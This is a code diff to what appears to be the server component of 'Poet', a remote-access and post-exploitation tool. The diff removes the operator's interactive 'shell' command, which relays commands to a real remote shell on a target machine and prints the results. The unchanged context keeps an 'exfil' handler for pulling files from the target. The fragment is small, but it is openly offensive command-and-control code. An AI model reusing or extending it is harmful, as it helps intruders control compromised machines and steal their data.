@@ -84,12 +84,6 @@ class PoetServer(object):
                             self.generic(base)
                     else:
                         self.cmd_help(3)
-                # shell
-                elif base == self.cmds[4]:
-                    if inp == 'shell':
-                        self.shell(prompt)
-                    else:
-                        self.cmd_help(4)
                 # exfil
                 elif base == self.cmds[5]:
                     if re.search('^exfil\s+([\w\/\\.~:\-]+\s+)+$', inp + ' ') and '-h' not in inp.split():
@@ -301,50 +295,6 @@ class PoetServer(object):
             del tmp[1]
         tmp = ' '.join(tmp)
         return tmp, write_flag, write_file
-
-    def shell(self, prompt):
-        """Posh `shell' command server-side.
-
-        Args:
-            prompt: shell prompt to use
-        """
-
-        while True:
-            try:
-                inp = raw_input(POSH_PROMPT + prompt).strip()
-            except KeyboardInterrupt:  # Ctrl-C -> new prompt
-                print
-                continue
-            except EOFError:  # Ctrl-D -> exit shell
-                print
-                break
-
-            if inp == '':
-                continue
-            elif inp == 'exit':
-                break
-            elif inp.split()[0] in self.cmds:
-                print """[!] WARNING: You've entered a posh command into the real remote shell on the
-    target. Continue? (y/n)""",
-                if raw_input().lower()[0] != 'y':
-                    continue
-
-            self.conn.send('shell {}'.format(inp))
-            try:
-                while True:
-                    rec = self.conn.recv()
-                    if rec == 'shelldone':
-                        break
-                    else:
-                        print rec,
-            except KeyboardInterrupt:
-                self.conn.send('shellterm')
-                # flush lingering socket buffer ('shelldone' and any
-                # excess data) and sync client/server
-                while self.conn.recv() != 'shelldone':
-                    pass
-                print
-                continue
 
     def chint(self, inp):
         """Chint command handler.
